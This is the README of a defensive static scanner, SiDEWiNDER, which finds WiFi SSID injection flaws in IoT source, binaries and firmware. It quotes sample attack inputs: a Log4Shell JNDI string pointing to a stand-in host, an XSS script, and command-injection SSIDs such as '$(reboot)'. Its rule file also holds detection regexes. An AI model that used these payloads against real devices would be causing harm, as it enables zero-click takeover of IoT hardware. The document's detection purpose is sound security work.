# SiDEWiNDER

**SSID Injection Detection & Wireless INjection Defense EngineeR**

```
  _____ _ ____  _______        ___ _   _ ____  _____ ____
 / ____(_)  _ \| ____\ \      / (_) \ | |  _ \| ____|  _ \
 \___ \| | | | |  _|  \ \ /\ / /| |  \| | | | |  _| | |_) |
  ___) | | |_| | |___  \ V  V / | | |\  | |_| | |___|  _ <
 |____/|_|____/|_____|  \_/\_/  |_|_| \_|____/|_____|_| \_\
```

A static vulnerability scanner purpose-built for detecting **WiFi SSID injection vulnerabilities** in IoT firmware, source code, and ELF binaries. Based on the [CommandInWiFi-Zeroclick](https://github.com/Veerababu-Penugonda/CommandInWiFi-Zeroclick) research.

SiDEWiNDER scans across **14 vulnerability classes**, cross-references **17 CVEs**, and supports **10 programming languages**  from C kernel drivers to Python IoT dashboards.

---

## Why SiDEWiNDER?

WiFi SSIDs are attacker-controlled input that many IoT devices trust implicitly. A malicious SSID like `` `reboot` `` or `<script>alert(1)</script>` can trigger:

- **Zero-click RCE** via command injection in `system()` / `popen()` calls
- **Buffer overflows** in WiFi stack SSID parsers (wpa_supplicant, wappd, net80211)
- **Log4Shell** via SSID logged through Log4j (`${jndi:ldap://evil/a}`)
- **XSS** in router web interfaces displaying scan results
- **Heap corruption** in firmware allocators (dlmalloc, newlib)

SiDEWiNDER finds these vulnerabilities **before** they reach production.

---

## Features

| Feature | Description |
|---|---|
| **Source Code Scanner** | Regex-based pattern matching across C, Python, JavaScript, PHP, Java, Lua, Go, Ruby, Perl, Shell |
| **Binary Analyzer** | ELF binary analysis (ARM, MIPS, x86)  import tables, string extraction, cross-referencing |
| **Firmware Extractor** | Full firmware image extraction via `unblob` (SquashFS, JFFS2, CramFS, UBIFS, ext4) |
| **Dependency Checker** | Detects known-vulnerable libraries (wpa_supplicant, Log4j, systeminformation, wappd, etc.) |
| **Confidence Scoring** | Multi-signal scoring: `confirmed` > `high` > `medium` > `low` based on SSID context proximity |
| **Deduplication** | Composite `file:line:class` keys eliminate duplicate findings |
| **CVE Cross-Reference** | 17 CVEs mapped to vulnerability classes with CVSS scores |
| **HTML/JSON Reports** | Dark-themed HTML reports with severity badges, confidence indicators, and class breakdown |
| **Multi-line Detection** | Sliding 3-line window catches patterns spanning multiple lines |
| **Safe Pattern Filtering** | Recognizes sanitized code (`shlex.quote`, `htmlspecialchars`, parameterized queries) to reduce false positives |

---

## 14 Vulnerability Classes

| Class | Severity | CWE | Description |
|---|---|---|---|
| `wifi_cmd` | Critical | CWE-78 | Shell command injection via SSID in `system()`/`popen()`/`exec()` |
| `wifi_overflow` | Critical | CWE-120 | Buffer overflow from SSID copy without length validation |
| `wifi_fmt` | Critical | CWE-134 | Format string  SSID used as format argument in `printf`/`syslog` |
| `wifi_heap` | Critical | CWE-122 | Heap metadata corruption via SSID overflow into allocator structures |
| `wifi_jndi` | Critical | CWE-917 | JNDI/expression language injection via SSID in Log4j |
| `wifi_xss` | High | CWE-79 | Cross-site scripting via unescaped SSID in web interfaces |
| `wifi_serial` | High | CWE-94 | Serialization/config injection  SSID in JSON/XML/SQL/YAML |
| `wifi_path` | High | CWE-22 | Path traversal via SSID used in filesystem path construction |
| `wifi_nosql` | High | CWE-943 | NoSQL/LDAP injection via SSID in database queries |
| `wifi_probe` | High | CWE-20 | Malformed SSID probes targeting WiFi stack parsing logic |
| `wifi_crlf` | Medium | CWE-113 | CRLF injection via SSID reflected in HTTP headers |
| `wifi_esc` | Medium | CWE-150 | Terminal escape injection via SSID in serial/log output |
| `wifi_enc` | Medium | CWE-176 | Encoding normalization bypass  validation before normalization |
| `wifi_chain` | Medium | CWE-20 | Multi-SSID chain  split payloads across concatenated scan results |

---

## Installation

```bash
git clone https://github.com/YourUsername/sidewinder.git
cd sidewinder
pip install -r requirements.txt
```

### Requirements

- Python 3.10+
- [unblob](https://github.com/onekey-sec/unblob) (for firmware extraction only)

### Dependencies

```
click>=8.0
rich>=13.0
jinja2>=3.1
pyelftools>=0.29
capstone>=5.0
```

---

## Usage

### Quick Start

```bash
# Scan source code
python3 cli.py scan /path/to/source

# Analyze ELF binaries
python3 cli.py binary /path/to/binaries

# Extract and scan firmware image
python3 cli.py firmware router_firmware.bin

# Check for vulnerable dependencies
python3 cli.py deps /path/to/project

# Run ALL scanners at once
python3 cli.py full /path/to/target

# Show vulnerability classes and CVE database
python3 cli.py info
```

### Options

```bash
# Write full results (all findings + summary) to a JSON file
python3 cli.py scan /target --json results.json
python3 cli.py full /target --json results.json
python3 cli.py firmware image.bin --json results.json

# Keep extracted firmware files
python3 cli.py firmware image.bin --keep

# Custom extraction directory
python3 cli.py firmware image.bin -e /tmp/extracted
```

> **Note:** HTML report generation was removed in a recent refactor and has
> not yet been reinstated. Use `--json` for machine-readable output; the
> console table is currently capped at 50 rows for readability.

---

## Example Output

```
  _____ _ ____  _______        ___ _   _ ____  _____ ____
 / ____(_)  _ \| ____\ \      / (_) \ | |  _ \| ____|  _ \
 \___ \| | | | |  _|  \ \ /\ / /| |  \| | | | |  _| | |_) |
  ___) | | |_| | |___  \ V  V / | | |\  | |_| | |___|  _ <
 |____/|_|____/|_____|  \_/\_/  |_|_| \_|____/|_____|_| \_\

  SSID Injection Detection & Wireless INjection Defense EngineeR
  v1.0.0 | 14 Vuln Classes | 17 CVEs | CommandInWiFi-Zeroclick

Scanning source code: tests/test_source/

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Severity ┃ Class          ┃ File             ┃ Details                      ┃
┡━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ CRITICAL │ wifi_cmd       │ vulnerable_c.c:13│ snprintf(cmd, "iwconfig ...  │
│ CRITICAL │ wifi_overflow  │ vulnerable_c.c:33│ strcpy(local_ssid, ssid);    │
│ CRITICAL │ wifi_fmt       │ vulnerable_c.c:50│ printf(ssid);                │
│ CRITICAL │ wifi_jndi      │ vuln_java.java:8 │ logger.info("AP: " + ssid);  │
│ HIGH     │ wifi_xss       │ vuln_web.html:5  │ {{ ssid }}                   │
│ HIGH     │ wifi_serial    │ vulnerable_c.c:61│ sprintf(query, "INSERT ...   │
│ MEDIUM   │ wifi_enc       │ vuln_python.py:36│ unicodedata.normalize(ssid)  │
└──────────┴────────────────┴──────────────────┴──────────────────────────────┘

╭──────────────────────────── Scan Summary ─────────────────────────────╮
│ Total: 65 | Critical: 42 | High: 18 | Medium: 5 | Low: 0 | Files: 4   │
╰───────────────────────────────────────────────────────────────────────╯
```

---

## Project Structure

```
sidewinder/
├── cli.py                          # Main CLI entry point (click + rich)
├── requirements.txt                # Python dependencies
├── core/
│   ├── source_scanner.py           # Static source code analysis engine
│   ├── binary_analyzer.py          # ELF binary analysis (ARM/MIPS/x86)
│   ├── firmware_extractor.py       # Firmware extraction via unblob
│   └── dependency_checker.py       # Known vulnerable library detection
├── config/
│   ├── cve_database.json           # 17 CVEs with full metadata
│   └── rules/
│       ├── wifi_cmd.json           # Command injection patterns
│       ├── wifi_overflow.json      # Buffer overflow patterns
│       ├── wifi_fmt.json           # Format string patterns
│       ├── wifi_xss.json           # XSS patterns
│       ├── wifi_serial.json        # Serialization injection patterns
│       ├── wifi_crlf.json          # CRLF injection patterns
│       ├── wifi_jndi.json          # JNDI/Log4Shell patterns
│       ├── wifi_path.json          # Path traversal patterns
│       ├── wifi_nosql.json         # NoSQL/LDAP injection patterns
│       ├── wifi_esc.json           # Terminal escape injection patterns
│       ├── wifi_enc.json           # Encoding bypass patterns
│       ├── wifi_heap.json          # Heap corruption patterns
│       ├── wifi_chain.json         # Multi-SSID chain patterns
│       └── wifi_probe.json         # Malformed SSID parsing patterns
└── tests/
    ├── test_scanners.py            # pytest snapshot suite (run with `pytest`)
    ├── conftest.py                 # shared pytest fixtures
    └── test_source/
        ├── vulnerable_c.c          # C test cases (cmd, overflow, fmt, serial, path, nosql, probe)
        ├── vulnerable_python.py    # Python test cases (cmd, enc)
        ├── vulnerable_java.java    # Java test cases (jndi)
        └── vulnerable_web.html     # HTML test cases (xss)
```

---

## CVE Database

SiDEWiNDER includes a curated database of 17 real-world CVEs related to SSID injection:

| CVE | Component | Impact |
|---|---|---|
| CVE-2017-9417 | Broadcom BCM43xx | Broadpwn  zero-click WiFi chip RCE |
| CVE-2024-20017 | MediaTek wappd | Zero-click OOB write (CVSS 9.8) |
| CVE-2015-1863 | wpa_supplicant | Heap overflow via SSID IE in P2P |
| CVE-2021-44228 | Log4j | Log4Shell RCE via logged SSID |
| CVE-2023-42810 | systeminformation | Command injection in wifiConnections() |
| CVE-2020-9395 | Realtek RTL8195A | Stack overflow without password |
| CVE-2022-23088 | FreeBSD net80211 | Heap overflow via Mesh ID IE |
| ... | ... | *+ 10 more in `config/cve_database.json`* |

---

## How It Works

### Source Scanner

1. Loads 14 JSON rule files containing regex patterns per language
2. Scans each source file line-by-line, matching against relevant patterns
3. Applies safe pattern filtering to exclude sanitized code
4. Runs a second pass with 3-line sliding window for multi-line patterns
5. Validates SSID context within a 10-line window around each finding
6. Computes confidence score based on multiple signals (SSID proximity, variable references, WiFi function names)
7. Deduplicates findings by `file:line:class` composite key

### Binary Analyzer

1. Parses ELF headers to identify architecture (ARM, MIPS, x86)
2. Extracts import table (dynamic symbols) to find dangerous functions
3. Extracts printable strings (ASCII, UTF-8, UTF-16LE)
4. Cross-references dangerous imports with SSID-related context strings
5. Matches binary signatures from rule files against extracted data
6. Scores confidence based on number of corroborating signals

### Firmware Extractor

1. Runs `unblob` to recursively extract firmware filesystem
2. Catalogs extracted files by type (ELF, source, web, config)
3. Prioritizes WiFi-related binaries (`wpa_supplicant`, `hostapd`, `wifid`, `wappd`, etc.)
4. Feeds extracted files into source scanner, binary analyzer, and dependency checker

### Dependency Checker

1. Walks directory tree looking for package manifests and ELF binaries
2. Matches library names and versions against known-vulnerable database
3. Supports version ranges (`>=2.0-beta9,<=2.14.1` for Log4j)
4. Checks JAR filenames for vulnerable Java libraries
5. Uses exact binary name matching (not substring) to avoid false positives

---

## Confidence Scoring

Each finding includes a confidence level based on contextual signals:

| Confidence | Meaning | Signals |
|---|---|---|
| **Confirmed** | Very likely exploitable | Shell command pattern + dangerous function import; direct SSID variable in sink |
| **High** | Strong indicator | SSID reference within 3 lines of finding; WiFi function names nearby |
| **Medium** | Probable vulnerability | SSID-related code within 10-line window; pattern matches known sink |
| **Low** | Needs manual review | Pattern match without nearby SSID context; generic function name |

---

## Development

```bash
# Install dev dependencies (includes pytest + ruff)
pip install -r requirements-dev.txt

# Run the test suite
pytest -v

# Lint
ruff check .
```

CI runs the same `ruff check` + `pytest` matrix on Python 3.11 and 3.12 - see
`.github/workflows/ci.yml`. The snapshot tests in `tests/test_scanners.py`
lock in current detection behavior; if a detection change is intentional,
update `EXPECTED_SOURCE_COUNTS` in that file.

---

## Adding Custom Rules

Each rule file in `config/rules/` follows this schema:

```json
{
  "class": "wifi_cmd",
  "name": "Command Injection via SSID",
  "severity": "critical",
  "cwe": "CWE-78",
  "zero_click": true,
  "source_patterns": {
    "c": ["system\\s*\\(.*ssid", "popen\\s*\\(.*ssid"],
    "python": ["os\\.system\\s*\\(.*ssid"],
    "go": ["exec\\.Command\\s*\\(.*ssid"]
  },
  "binary_signatures": {
    "dangerous_imports": ["system", "popen"],
    "context_strings": ["iwconfig", "essid"]
  },
  "safe_patterns": ["shlex\\.quote\\s*\\(.*ssid"],
  "test_payloads": ["|reboot|", "$(reboot)"]
}
```

To add a new vulnerability class, create a new JSON file in `config/rules/`  SiDEWiNDER automatically loads all rule files at startup.

---

## Based On

This tool is built on the research from the **CommandInWiFi-Zeroclick** project, which demonstrates how WiFi SSIDs can be weaponized as zero-click attack vectors against IoT devices.

---

## Author

**Veerababu Penugonda**

---

## License

This project is intended for **authorized security testing and research only**. Use responsibly.
